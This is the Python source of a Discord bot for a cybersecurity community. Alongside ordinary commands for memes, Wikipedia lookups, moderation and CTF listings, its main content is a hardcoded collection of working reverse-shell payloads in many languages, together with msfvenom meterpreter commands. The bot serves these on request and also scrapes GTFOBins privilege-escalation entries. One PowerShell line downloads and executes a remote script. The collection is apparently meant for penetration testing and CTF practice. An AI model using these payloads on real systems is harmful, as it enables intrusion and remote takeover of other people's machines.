import discord
from discord.ext import commands
import random
import os
import wikipedia
import asyncio
import aiohttp
import string
import secrets
import requests
from bs4 import BeautifulSoup
from keep_alive import keep_alive
client = commands.Bot(command_prefix='.')

client.remove_command('help')

payload_list = {
  "reverse": {
    "bash_tcp": 
['''bash -i >& /dev/tcp/10.0.0.1/4242 0>&1

0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196''']
    ,
    "bash_upd": 
['''Victim:
sh -i >& /dev/udp/10.0.0.1/4242 0>&1

Listener:
nc -u -lvp 4242''']
    ,
    "socat": ['''
user@attack$ socat file:`tty`,raw,echo=0 TCP-L:4242

user@victim$ /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242

user@victim$ wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242'''],

"perl":['''
perl -e 'use Socket;$i="10.0.0.1";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
''',
'''
Windows only

perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
'''
],
"php":['''
php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
''',
'''php -r '$sock=fsockopen("10.0.0.1",4242);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
''','''
php -r '$sock=fsockopen("10.0.0.1",4242);\`/bin/sh -i <&3 >&3 2>&3`;'
''','''
php -r '$sock=fsockopen("10.0.0.1",4242);system("/bin/sh -i <&3 >&3 2>&3");'
''','''
php -r '$sock=fsockopen("10.0.0.1",4242);passthru("/bin/sh -i <&3 >&3 2>&3");'
''','''
php -r '$sock=fsockopen("10.0.0.1",4242);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
''','''

php -r '$sock=fsockopen("10.0.0.1",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
 '''],
"ruby":['''
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4242).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.0.0.1","4242");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
''','''
**Windows only**

ruby -rsocket -e 'c=TCPSocket.new("10.0.0.1","4242");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
'''],

"golang":['''
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.0.0.1:4242");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
'''],

"netcat":['''
nc -e /bin/sh 10.0.0.1 4242
nc -e /bin/bash 10.0.0.1 4242
nc -c bash 10.0.0.1 4242
'''],

"war":['''
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f war > reverse.war
strings reverse.war | grep jsp # in order to get the name of the file
'''],

"lua":['''
**Linux only**

lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','4242');os.execute('/bin/sh -i <&3 >&3 2>&3');"
''','''
**Windows and Linux**

lua5.1 -e 'local host, port = "10.0.0.1", 4242 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
'''],

"c":['''
Compile with \`gcc /tmp/shell.c --output csh && csh`

#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = 4242;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("10.0.0.1");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);

    return 0;    '''],

"java":['''
String host="10.0.0.1";

int port=4242;

String cmd="cmd.exe";

Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
'''],

"awk":['''
awk 'BEGIN {s = "/inet/tcp/0/10.0.0.1/4242"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
'''],

"powershell":['''


powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
''','''

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
''','''

powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')
''']

},
"meterpreter": {
        "Windows_staged_reverse_TCP":
        ['''msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe''']
        ,
        "Windows_Stageless_reverse_TCP":
        ['''msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe''']
        ,
        "Linux_Staged_reverse_TCP":
        ['''msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf >reverse.elf''']
        ,
        "Linux_Stageless_reverse_TCP":
        ['''msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf >reverse.elf''']
        ,
        "Other_Platforms":[
        '''$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f elf > shell.elf''',
'''$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f exe > shell.exe''',
'''$ msfvenom -p osx/x86/shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f macho > shell.macho''',
'''$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f asp > shell.asp''',
'''$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f raw > shell.jsp''',
'''$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f war > shell.war''',
'''$ msfvenom -p cmd/unix/reverse_python LHOST="10.0.0.1" LPORT=4242 -f raw > shell.py''',
'''$ msfvenom -p cmd/unix/reverse_bash LHOST="10.0.0.1" LPORT=4242 -f raw > shell.sh''',
'''$ msfvenom -p cmd/unix/reverse_perl LHOST="10.0.0.1" LPORT=4242 -f raw > shell.pl''',
'''$ msfvenom -p php/meterpreter_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php'''
]  }
}


payloads_key = list(payload_list.keys())
inside_payload = []
for i in range(len(payloads_key)):
    inside_payload.append(list(payload_list[payloads_key[i]].keys()))


@client.event
async def on_command_error(ctx, error):
    if isinstance(error, discord.ext.commands.errors.CommandNotFound):
        embed = discord.Embed(
        colour = 0x00F6E6,
    )
        
        embed.add_field(name='INFO',value="**Use .help To Check Commands**", inline=False)
        await ctx.send(embed=embed)
        

@client.command()
async def about(ctx):

    embed=discord.Embed(title="Vulnfreak", url="https://vulnfreak.com/", description="Reach Out Our Website \n :small_red_triangle_down: :small_red_triangle_down: :small_red_triangle_down: :small_red_triangle_down: :small_red_triangle_down: :small_red_triangle_down: :small_red_triangle_down: :small_red_triangle_down:", colour = discord.Colour.green())
    embed.set_thumbnail(url="https://vulnfreak.com/images/logo.png")
    embed.set_author(name='About')
    embed.add_field(name='Vulnfreak', value=f'''UTOPIA for
📊 | Tech Updates
💻 | Programing
👨‍💻 | Cybersecurity
🌐 | Web development
 ''', inline=False)
    embed.add_field(name='Twitter', value='**[Follow Twitter](https://www.twitter.com/vulnfreak)**',inline=False)
    embed.add_field(name='Instagram', value='**[Follow Instagram](https://www.instagram.com/vulnfreak)**',inline=False)
    embed.add_field(name='Discord', value='**[Join Discord](https://discord.gg/UpBQHeesa2)**',inline=False)
    embed.add_field(name='Blog', value='**[Read Blogs](https://blog.vulnfreak.com)**',inline=False)
    embed.add_field(name='BOT', value='**[Read More About Bot](https://bot.vulnfreak.com)**',inline=False)
    await ctx.send(embed=embed)



@client.command(brief="Help with Bot")
async def help(ctx):
    embed = discord.Embed(
        colour = discord.Colour.blue()
    )

    embed.set_thumbnail(url="https://vulnfreak.com/images/bot.png")
    embed.set_author(name='Help')
    embed.add_field(name='Bot Commands', value=f'Command Help You To Operate Me \n :small_red_triangle_down: :small_red_triangle_down: :small_red_triangle_down: :small_red_triangle_down: :small_red_triangle_down: :small_red_triangle_down: :small_red_triangle_down: :small_red_triangle_down: ', inline=False)
    embed.set_author(name='Help')
    embed.add_field(name='.hello', value =f'Bot Says Hello to you', inline=False)
    embed.set_author(name='Help')
    embed.add_field(name='.av', value='Display Avatar of Selected User', inline=False)
    embed.set_author(name='Help')
    embed.add_field(name='.meme', value='For Memes', inline=False)
    embed.set_author(name='Help')
    embed.add_field(name='.clear', value='Clear Chats', inline=False)
    embed.set_author(name='Help')
    embed.add_field(name='.about', value='About Me', inline=False)
    embed.set_author(name='Help')
    embed.add_field(name='.kick', value='Kick a user', inline=False)
    embed.set_author(name='Help')
    embed.add_field(name='.ban', value='Ban a user', inline=False)
    embed.set_author(name='Help')
    embed.add_field(name='.wiki', value='Wikipedia Result{type string in "" for Better Result}', inline=False)
    embed.set_author(name='Help')
    embed.add_field(name='.gtf', value='To get all GTFOBins Binary to Exploit', inline=False)
    embed.set_author(name='Help')
    embed.add_field(name='.payloads', value='For Payload Menu', inline=False)
    embed.set_author(name='Help')
    embed.add_field(name='.ctftime', value='For Upcoming CTFs', inline=False)

    await ctx.send(embed=embed)

@client.command(brief="Help with Bot")
async def payloads(ctx):

    embed = discord.Embed(
        colour = discord.Colour.red()
    )
    embed.set_thumbnail(url="https://vulnfreak.com/images/bot.png")
    embed.set_author(name='payload')
    embed.add_field(name='Some Payloads for you', value=f'\n :small_red_triangle_down: :small_red_triangle_down: :small_red_triangle_down: :small_red_triangle_down: :small_red_triangle_down: :small_red_triangle_down: :small_red_triangle_down: :small_red_triangle_down: ', inline=False)
    embed.set_author(name='payload')
    embed.add_field(name='.reverse', value =f'Available:- bash_tcp, bash_upd, socat ', inline=False)
    embed.set_author(name='Help')
    embed.add_field(name='.msf', value='Metasploit Payloads Available:- window , linux , other', inline=False)
    await ctx.send(embed=embed)

@client.event
async def on_ready():
    await client.change_presence(status=discord.Status.online,activity=discord.Game(f'To Hack Me Try .help 🤖'))
    print("Bot is Up")

@client.command()
async def hello(ctx):
    embed = discord.Embed(
        colour = 0xffffff,
    )
        
    embed.add_field(name='HELLO',value="**Hope You Are Enjoying Your Stay 😎**", inline=False)
    await ctx.send(embed=embed)
    


@client.command(brief="Clear Chat Messages")
@commands.has_permissions(administrator=True)
async def clear(ctx, amount=1):
       await ctx.channel.purge(limit=amount+1)
    
        

@clear.error
async def clear_error(ctx, error):
    if isinstance(error, commands.errors.BadArgument):
        embed = discord.Embed(
        colour = 0xff0000,
    )
        
        embed.add_field(name='WARNING',value="**Use .help For Better Use Of Commands**", inline=False)
        await ctx.send(embed=embed)
    if isinstance(error, commands.MissingPermissions):
        embed = discord.Embed(
        colour = 0xff0000,
    )
        
        embed.add_field(name='WARNING',value="**You Don't Have Permissions.**", inline=False)
        await ctx.send(embed=embed)


@client.command()
async def wiki(ctx,*, message):
    if(ctx.channel.id ==803177701883379722):
        my_wiki = wikipedia.summary(message)
        embed = discord.Embed(
        color = 0xa652bb,
    )

    
        embed.set_thumbnail(url= 'https://upload.wikimedia.org/wikipedia/commons/thumb/8/80/Wikipedia-logo-v2.svg/150px-Wikipedia-logo-v2.svg.png')
        embed.set_author(name='Wikipedia Result')
        if len(my_wiki) > 1000:
            my_wiki = str(my_wiki)[0:1000]
            embed.add_field(name=f'{message}', value=f'{my_wiki} ', inline=False) 
            await ctx.send(embed=embed)
        else:
            embed.add_field(name=f'{message}', value=f'{my_wiki} ', inline=False) 
            await ctx.send(embed=embed)

    else:
        embed = discord.Embed(
        colour = 0x000000,
    )
        
        embed.add_field(name='ALERT',value="**Please Use #wiki Channel**", inline=False)
        await ctx.send(embed=embed)



@client.command(brief="Reverse Payloads")
async def reverse(ctx ,*, message):
    if(ctx.channel.id ==803177990837633055):
        if message == 'help':
            embed = discord.Embed(
        colour = discord.Colour.greyple()
        )


        index_of_seach_key = payloads_key.index('reverse')
        list_of_paylods = inside_payload[index_of_seach_key]
        if message == "help":
            embed = discord.Embed(
        colour = discord.Colour.greyple()
    )
        
            for i in list_of_paylods:
                embed.set_author(name='Reverse Payloads')
                embed.add_field(name=f'{i}', value =f'Payloads', inline=False)
            await ctx.send(embed=embed)
        if message in list_of_paylods : 
            if len(payload_list['reverse'][message])<1:
                embed = discord.Embed(
        colour = discord.Colour.greyple()
    )
                embed.set_author(name=f'{message}')
                embed.add_field(name=f'Payloads', value =f'{payload_list["reverse"][message][0]}', inline=False)
                await ctx.send(embed=embed)
            else:
                for i in range(len(payload_list['reverse'][message])):
                    embed = discord.Embed(
        colour = discord.Colour.greyple()
    )
                    embed.set_author(name=f'{message}')
                    embed.add_field(name=f'Payloads', value =f'{payload_list["reverse"][message][i]}', inline=False)
                    await ctx.send(embed=embed)
    else:
        embed = discord.Embed(
        colour = 0x000000,
    )
        
        embed.add_field(name='ALERT',value="**Please Use #payloads Channel**", inline=False)
        await ctx.send(embed=embed)
    
  

@client.command()
async def msf(ctx,*,message):
    
    if(ctx.channel.id ==803177990837633055):
        if message == 'help':
            embed = discord.Embed(
        colour = 0x00c09a,
        )


        index_of_seach_key = payloads_key.index('meterpreter')
        list_of_paylods = inside_payload[index_of_seach_key]
        if message == "help":
            embed = discord.Embed(
        colour = 0x00c09a,
    )
        
            for i in list_of_paylods:
                embed.set_author(name=' Meterpreter Payloads')
                embed.add_field(name=f'{i}', value =f'Payloads', inline=False)
            await ctx.send(embed=embed)
        if message in list_of_paylods : 
            if len(payload_list['meterpreter'][message])<1:
                embed = discord.Embed(
        colour = 0x00c09a,
    )
                embed.set_author(name=f'{message}')
                embed.add_field(name=f'Payloads', value =f'{payload_list["meterpreter"][message][0]}', inline=False)
                await ctx.send(embed=embed)
            else:
                for i in range(len(payload_list['meterpreter'][message])):
                    embed = discord.Embed(
        colour = 0x00c09a,
    )
                    embed.set_author(name=f'{message}')
                    embed.add_field(name=f'Payloads', value =f'{payload_list["meterpreter"][message][i]}', inline=False)
                    await ctx.send(embed=embed)
    else:
        embed = discord.Embed(
        colour = 0x000000,
    )
        
        embed.add_field(name='ALERT',value="**Please Use #payloads Channel**", inline=False)
        await ctx.send(embed=embed)
        
    

        
@client.command()
async def ctftime(ctx,message):
    command = message.split(" ")
    
    if command[0] == 'help':
            embed = discord.Embed(
        colour = discord.Colour.blue()
    )

            embed.set_thumbnail(url="https://pbs.twimg.com/profile_images/2189766987/ctftime-logo-avatar_400x400.png")
    
            embed.add_field(name='For Upcoming CTFs', value=f'.ctftime number ( 1-5 )',inline=False)
            embed.add_field(name='For Help', value=f'.ctftime help',inline=False)
            await ctx.send(embed=embed)
    
    
    if int(command[0]) :
        
        if int(command[0]) > 5 or int(command[0])<1:
            
            embed = discord.Embed(
        colour = 0xff0000,
    )
        
            embed.add_field(name='INFO',value="**Use .ctftime help For Better Use Of Command**", inline=False)
            await ctx.send(embed=embed)
        else:
           
            headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0',
        }
            upcoming = 'https://ctftime.org/api/v1/events/'
            limit = command[0]
            response = requests.get(upcoming, headers=headers, params=limit)
            jdata = response.json()


            for i in range(int(limit)):
                new_item = jdata[i]
                name = new_item['organizers'][0]['name']
                url = new_item['url']
                type = new_item['format']
                timestamp = "Days : " + str(new_item['duration']['days']) + " Hours : " + str(new_item['duration']['hours'])
                image = new_item['logo'] 
                if image == '':
                    image = "https://pbs.twimg.com/profile_images/2189766987/ctftime-logo-avatar_400x400.png"
                weight = new_item['weight']
                embed = discord.Embed(title=f"{url}", url=f"{url}", colour = discord.Colour.green())
                embed.set_thumbnail(url=image)
                embed.set_author(name=f"☣ {name}")
                embed.add_field(name=f'format', value =f'{type}', inline=True)
                embed.add_field(name=f'Duration', value =f'{timestamp}', inline=True)
                embed.add_field(name=f'Weight', value =f'{weight}', inline=True)               
                await ctx.send(embed=embed)
    else:
        embed = discord.Embed(
        colour = 0xff0000,
    )
        
        embed.add_field(name='INFO',value="**Use .ctftime help For Better Use Of Command**", inline=False)
        await ctx.send(embed=embed)
        
        
@ctftime.error
async def clear_error(ctx, error):
    if isinstance(error, commands.errors.BadArgument):
        embed = discord.Embed(
        colour = 0xff0000,
    )
        
        embed.add_field(name='WARNING',value="**Use .ctftime help For Better Use Of Command**", inline=False)
        await ctx.send(embed=embed)

@client.command()
async def gtf(ctx, message):
    if(ctx.channel.id ==803178117673385984):
        page = requests.get(
        f"https://gtfobins.github.io/gtfobins/{message}")
        soup = BeautifulSoup(page.content, 'html.parser')
    


        all_h1_tags = []
        all_code_tags = []


        for element in soup.select('h2'):
            all_h1_tags.append(element.text)


        remove_code = []


        for element in soup.select('.highlighter-rouge'):
            remove_code.append(element.text)

        for element in soup.select('code'):
            all_code_tags.append(element.text)

        for element in range(len(remove_code)):
            if  remove_code[element] in all_code_tags:
        
                all_code_tags.remove(remove_code[element])
            else:
                pass
    
        for element in range(len(all_code_tags)):
            embed = discord.Embed(
        color = 0x008e44,
    )
            embed.set_author(name=f'{message}')
            embed.add_field(name=f'{all_h1_tags[element]}', value =f'{all_code_tags[element]}', inline=False)
            await ctx.send(embed=embed)
    else:
        embed = discord.Embed(
        colour = 0x000000,
    )
        
        embed.add_field(name='ALERT',value="**Please Use #gtfo Channel**", inline=False)
        await ctx.send(embed=embed)

@client.command()
@commands.has_permissions(administrator=True)
async def kick(ctx, member : discord.Member, *, reason=None):
    await member.kick(reason=reason)
    await member.ban(reason=reason)
    embed = discord.Embed(
        colour = 0x00ff00,
    )
        
    embed.add_field(name='BANNED',value=f"**{member} Kicked From The Server**", inline=False)
    await ctx.send(embed=embed)
    
   

@client.command()
@commands.has_permissions(administrator=True)
async def ban(ctx, member : discord.Member, *, reason=None):
    await member.ban(reason=reason)
    embed = discord.Embed(
        colour = 0x00ff00,
    )
        
    embed.add_field(name='BANNED',value=f"**{member} is Banned From The Server**", inline=False)
    await ctx.send(embed=embed)
    


@ban.error
async def ban_error(ctx, error):
    if isinstance(error, commands.errors.BadArgument):
        embed = discord.Embed(
        colour = 0xff0000,
    )
        
        embed.add_field(name='WARNING',value="**Use .help For Better Use Of Commands**", inline=False)
        await ctx.send(embed=embed)
    if isinstance(error, commands.MissingPermissions):
        embed = discord.Embed(
        colour = 0xff0000,
    )
        
        embed.add_field(name='WARNING',value="**You Don't Have Permissions.**", inline=False)
        await ctx.send(embed=embed)

@kick.error
async def kick_error(ctx, error):
    if isinstance(error, commands.errors.BadArgument):
        embed = discord.Embed(
        colour = 0xff0000,
    )
        
        embed.add_field(name='WARNING',value="**Use .help For Better Use Of Commands**", inline=False)
        await ctx.send(embed=embed)
    if isinstance(error, commands.MissingPermissions):
        embed = discord.Embed(
        colour = 0xff0000,
    )
        
        embed.add_field(name='WARNING',value="**You Don't Have Permissions.**", inline=False)
        await ctx.send(embed=embed)


@client.command(brief="For Funny Memes")
async def meme(ctx):
    embed = discord.Embed(title="Meme", description="Meme")
    async with aiohttp.ClientSession() as cs:
        async with cs.get('https://www.reddit.com/r/dankmemes/new.json?sort=hot') as r:
           res = await r.json()
           embed.set_image(url=res['data']['children'] [random.randint(0, 30)]['data']['url'])
           await ctx.send(embed=embed)

@client.command()
async def av(ctx, *, member: discord.Member): # set the member object to None
    show_avatar = discord.Embed(
        title=f"{member}",
        description="Avatar",
        color = discord.Color.dark_blue()
    )
    show_avatar.set_image(url='{}'.format(member.avatar_url))
    await ctx.send(embed=show_avatar)


keep_alive()
client.run('API_TOKEN')


